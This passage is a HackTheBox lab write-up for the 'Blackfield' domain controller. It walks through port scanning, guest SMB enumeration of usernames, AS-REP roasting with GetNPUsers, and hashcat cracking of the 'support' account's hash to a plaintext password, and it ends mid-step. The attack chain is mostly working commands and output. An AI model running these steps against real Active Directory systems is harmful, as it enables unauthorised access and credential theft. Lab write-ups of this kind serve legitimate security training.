# Blackfield | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop$ sudo nmap -A -p- -T4 10.10.10.192
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 23:10 EDT
Nmap scan report for 10-10-10-192.tpgi.com.au (10.10.10.192)
Host is up (0.34s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-29 10:23:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=9/28%Time=5F72A716%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h06m35s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-09-29T10:25:44
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   341.01 ms 10.10.14.1
2   341.11 ms 10-10-10-192.tpgi.com.au (10.10.10.192)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 547.66 seconds
```
The machine is running Windows Server services such as Kerberos and LDAP as well as WinRM and RPC.

### 2. Enumerate services
I start off with SMB, trying accessing shares as guest.
```bash
kali@kali:~/Desktop$ smbclient -U 'guest' -L \\10.10.10.192
Enter WORKGROUP\guest's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
kali@kali:~/Desktop$ 

kali@kali:~/Desktop$ crackmapexec smb 10.10.10.192 -u guest -p '' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest: 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
```
Only 2 shares are readable. However one of them is the profiles share, so I can login to this and list the share to get a lot of usernames.
```bash
kali@kali:~/Desktop$ smbclient \\\\BLACKFIELD.local\\profiles$ -U guest
Enter WORKGROUP\guest's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 3900204 blocks available
smb: \>
```
With this large amount of users (looks like every user in the domain), I can now try seeing if any do not require preauthentication.
```bash
kali@kali:~/Desktop/htb/blackfield$ GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile usernames.txt 'blackfield.local/' -format hashcat
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:daf5ba5f1a7594a656c5ee2c5cb010ec$7567ebf16d0e58584ea7157aeffa4c5f824aa2cee9d1ac50a63c46f3c902c812e1ac767553c5dfd84a1fd33a8caa169a8cf4969ce96588330d854dca683417bac5c5e7a99e1fc2dc6a7386a5beabd84d241193230daf3dd3d871c32ee277cc222193dcba2d20242849279cf868eb873425a14addac70f5fc293a7183c95401b451b572ba19df10dc0faa8461e8880becd05727eb675f9b5c6b788997fbe6f7a087f24c7212bf4f3c584d037594b57be2628301fc76b4b23d209179954322311f7937706f1d9ec6645ac6c39156a9e97aa0017fac1948f72ebe4d842ad669c7e9fa6192f1799a4c615ae93cd4abbb6b4ea1c501f4
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
The user "support" does not require preauth so we are able to retrieve a TGT.

### 3. Crack the TGT
```bash
kali@kali:~/Desktop/htb/blackfield$ hashcat -a 0 -m 18200 support.aesrep /usr/share/wordlists/rockyou.txt --force
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 1424/1488 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$support@BLACKFIELD.LOCAL:daf5ba5f1a7594a656c5ee2c5cb010ec$7567ebf16d0e58584ea7157aeffa4c5f824aa2cee9d1ac50a63c46f3c902c812e1ac767553c5dfd84a1fd33a8caa169a8cf4969ce96588330d854dca683417bac5c5e7a99e1fc2dc6a7386a5beabd84d241193230daf3dd3d871c32ee277cc222193dcba2d20242849279cf868eb873425a14addac70f5fc293a7183c95401b451b572ba19df10dc0faa8461e8880becd05727eb675f9b5c6b788997fbe6f7a087f24c7212bf4f3c584d037594b57be2628301fc76b4b23d209179954322311f7937706f1d9ec6645ac6c39156a9e97aa0017fac1948f72ebe4d842ad669c7e9fa6192f1799a4c615ae93cd4abbb6b4ea1c501f4:#00^BlackKnight
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:daf5ba5f1a75...c501f4
Time.Started.....: Tue Sep 29 00:11:59 2020, (16 secs)
Time.Estimated...: Tue Sep 29 00:12:15 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   924.6 kH/s (8.54ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14319616/14344385 (99.83%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: (Muffin) -> #!hrvert

Started: Tue Sep 29 00:11:56 2020
Stopped: Tue Sep 29 00:12:16 2020
```
A valid set of credentials has been discovered: `support:#00^BlackKnight`.

Throw this into CME:
```bash
